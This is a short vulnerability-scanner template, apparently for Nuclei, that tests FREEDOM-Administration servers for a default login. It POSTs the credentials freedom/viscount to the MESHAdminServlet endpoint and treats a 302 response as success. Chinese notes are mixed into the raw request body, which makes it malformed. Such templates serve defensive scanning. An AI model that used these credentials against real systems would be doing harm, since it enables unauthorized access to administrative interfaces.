id: poc-elhce5hbrwltumge
info:
  name: FREEDOM-Administration 默认密码漏洞
  author: hacktwo
  severity: medium
  description: ''
  tags: default-login,2025
http:
- raw:
  - 'POST /mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=login HTTP/1.1

    Content-Type: application/x-www-form-urlencoded

    Host: {{Hostname}}

    formLoginName=freedom&formLoginPassword=viscount

    出现302即可跳转

    也有可能出现200状态码，此时需要判断响应中是否存在Log  Out


    默认用户名密码：

    freedom/viscount'
  redirects: false
  matchers:
  - status:
    - 302
    type: status
